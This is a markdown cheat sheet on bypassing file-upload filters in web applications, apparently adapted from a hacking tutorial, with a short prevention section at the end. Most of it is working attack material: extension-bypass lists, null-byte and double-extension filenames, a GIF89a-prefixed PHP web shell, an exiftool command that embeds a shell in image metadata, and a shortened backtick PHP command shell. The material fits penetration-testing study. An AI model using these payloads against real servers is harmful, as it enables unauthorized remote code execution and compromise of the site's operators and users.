## Method-1: Bypassing Blacklists

   - Blacklisting is a type of protection where certain strings of data, in this case, specific extensions, are explicitly prohibited from being sent to the server.

**Bypassing php blacklist filters and for that below there are some extensions:**
```php
.pht, .phtml, .php3, .php4, .php5, .php6, .inc
```


**Another popular extension for [web shells](https://null-byte.wonderhowto.com/how-to/upload-shell-web-server-and-get-root-rfi-part-1-0162818/) is [JSP](https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/), and here are some alternatives:**
```php
.jspx, .jspf, .jsw, .jsv
```


**In some situations, simply changing the case of the extension can trick filters into accepting the file, like so:**
```php
.pHp, .Php, .phP
```


**Try adding "special characters at the end." You could use Burp to "bruteforce" all the "ascii" and "Unicode" characters. (Note that you can also try to use the "previously" motioned extensions)**

```php
file.php%20_
file.php%0a_
file.php%00_
file.php%0d%0a_
file.php/
file.php.\
file.
file.php....
file.pHp5....
```


## Method-2: Bypassing Whitelists

   - Whitelisting is precisely the opposite of blacklisting, where the server accepts only specific extensions. 
   - For example, an application that allows you to upload a [profile picture](https://null-byte.wonderhowto.com/how-to/steganography-hide-secret-data-inside-image-audio-file-seconds-0180936/) might only take JPG, JPEG, or PNG files.
   - While this type of prevention is better than blacklisting, it can still be easily bypassed.

**Some web servers, such as [Apache](https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-configuring-apache-0164096/), allow files with double extensions. That means we can trick the server into accepting a PHP file that also has a JPG extension tacked on the end:**
```php
shell.php.jpg
```


**We can also use a null byte injection to bypass whitelist filters. Anything after the null character will be ignored when the file is saved.**
```php
shell.php%00.jpg
```

Or:

```php
shell.php\x00.jpg
```


##### Bypassing with null byte char using burp

   - This can also be accomplished with Burp and modifying the hex request.
   - Name the file **shell.phpD.jpg** — we'll replace the **D** character with a null character during the request. When uploading the file, intercept the request, go to the hex tab, and find the hex representation of the **D** character:
  
  ![[file_uploads1.jpg]]
  Simply replace the **44** with **00** and send the request through:
  
  ![[file_uploads2.jpg]]
  This technique can be used in tricky situations where the standard null byte injection won't work.

#### Bypassing whitelist with manipulating header

   - Usually, if an upload function accepts images, it will accept GIF files as well. We can add **GIF89a;** to the beginning of the shell to trick the upload:
```php
GIF89a; <?php system($_GET['cmd']); ?>
```

## Method 3: Exif Data

   - The next method to bypass file upload restrictions utilizes Exif data in an image.
   - We can insert a comment that contains valid PHP code that will be executed by the server when the image is processed.

**We can use "exiftool" to do this — if it is not installed already, install it with the package manager:**
```sh
apt install exiftool
```


>**Then we can insert a simple [command shell](https://null-byte.wonderhowto.com/how-to/use-commix-automate-exploiting-command-injection-flaws-web-applications-0189044/) as a comment in our pic:**
```sh
exiftool -Comment="<?php system($_GET['cmd']); ?>" pic.jpg
```


**Now if we use the "file" command on our pic, we can see the code was successfully inserted:**
```sh
file pic.jpg
```


>**All we have to do now is add a PHP extension so it can be executed:**
```sh
mv pic.jpg pic.php.jpg
```

**Note** - This technique can be combined with any of the approaches to bypass blacklists or whitelists.

## Method 4: Other Bypass Techniques

   - Sometimes, the only thing preventing individual files from being uploaded is client-side JavaScript. If the upload function still works without it, simply turning off JavaScript in the browser can sometimes beat restrictions. If that doesn't work, intercepting the request and changing the file extension can easily bypass client-side filters.
   - The content type of a file can also be used as a way to validate uploaded content. For example, an image upload will usually check that the content type of the file is an image, not a script or other malicious file type.
   - This type of prevention can easily be bypassed by [intercepting the request and changing the content type](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-using-burp-suite-0164148/).
   - In some situations, the length of the content can also be used to validate uploaded files. It will depend on the specific circumstances, but often all that's needed is a shorter payload. For example, a typical PHP command shell can be shortened to this:

```php
<?=`$_GET[x]`?>
```

## Preventing Unrestricted File Uploads

   - Several precautions developers can take to prevent unrestricted file uploads and reduce the likelihood of an attacker bypassing restrictions. First and foremost, the [directory](https://null-byte.wonderhowto.com/how-to/perform-directory-traversal-extract-sensitive-information-0185558/) where the uploads are stored should have no execute permissions. Consider storing files in a [database](https://null-byte.wonderhowto.com/how-to/sql-injection-101-database-sql-basics-every-hacker-needs-know-0184255/) rather than on the filesystem at all.
   - only one dot should be permitted. Also, the size should be limited as multiple large files can lead to denial of service.
   - After a file is uploaded, the name should be changed, ideally, to a [hash](https://null-byte.wonderhowto.com/how-to/use-hash-identifier-determine-hash-types-for-password-cracking-0200447/) that cannot be guessed. This will prevent attackers from being able to find their file after it is uploaded.
   - It is also wise to prevent files from being overwritten, so hashes cannot be deduced by an attacker.

